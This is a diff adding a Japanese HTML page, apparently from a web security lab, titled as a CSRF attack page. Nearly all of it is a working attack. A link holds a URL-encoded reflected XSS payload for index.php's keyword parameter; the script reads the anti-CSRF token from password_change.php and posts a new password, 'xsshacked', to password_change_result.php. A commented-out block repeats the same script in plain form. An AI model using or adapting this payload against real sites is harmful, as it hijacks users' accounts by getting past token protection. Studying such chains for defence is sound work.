@@ -1,0 +1,38 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CSRF攻撃</title>
+</head>
+<body>
+    <h1>CSRF攻撃ページ</h1>
+    <p>このページを訪れると、自動的にパスワードが「xsshacked」に変更されます。</p>
+    <a href="index.php?keyword=%3Cscript%3Efunction%20csrfAttack()%20%7B%0A%0A%20%20%20%20const%20xhrGetToken%20%3D%20new%20XMLHttpRequest()%3B%0A%20%20%20%20xhrGetToken.open('GET'%2C%20'password_change.php'%2C%20true)%3B%0A%20%20%20%20xhrGetToken.onload%20%3D%20function()%20%7B%0A%20%20%20%20%20%20%20%20if%20(xhrGetToken.status%20%3D%3D%3D%20200)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20const%20responseText%20%3D%20xhrGetToken.responseText%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20const%20tokenMatch%20%3D%20responseText.match(/name%3D%22token%22%20value%3D%22(.%2B%3F)%22/)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20if%20(tokenMatch)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20const%20token%20%3D%20tokenMatch%5B1%5D%3B%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20const%20xhrChangePassword%20%3D%20new%20XMLHttpRequest()%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20xhrChangePassword.open(%22POST%22%2C%20%22password_change_result.php%22%2C%20true)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20xhrChangePassword.setRequestHeader(%22Content-Type%22%2C%20%22application/x-www-form-urlencoded%22)%3B%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20const%20params%20%3D%20new%20URLSearchParams()%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20params.append(%22new_password%22%2C%20%22xsshacked%22)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20params.append(%22token%22%2C%20token)%3B%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20xhrChangePassword.send(params.toString())%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%7D%3B%0A%20%20%20%20xhrGetToken.send()%3B%0A%7D%0AcsrfAttack()%3B%0A%3C/script%3E">ここをクリックするとCSRF攻撃が実行されます</a><br>
+    <!-- <a href="index.php">パスワード変更の確認</a> -->
+
+    <!-- <script>
+        function csrfAttack() {
+            // パスワード変更ページからトークンを取得
+            const xhrGetToken = new XMLHttpRequest();
+            xhrGetToken.open('GET', 'password_change.php', true);
+            xhrGetToken.onload = function() {
+                if (xhrGetToken.status === 200) {
+                    const responseText = xhrGetToken.responseText;
+                    const tokenMatch = responseText.match(/name="token" value="(.+?)"/);
+                    if (tokenMatch) {
+                        const token = tokenMatch[1];
+
+                        // パスワード変更リクエストを送信
+                        const xhrChangePassword = new XMLHttpRequest();
+                        xhrChangePassword.open("POST", "password_change_result.php", true);
+                        xhrChangePassword.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+                        xhrChangePassword.send("new_password=xsshacked&token=" + token);
+                    }
+                }
+            };
+            xhrGetToken.send();
+        }
+    </script> -->
+</body>
+</html>
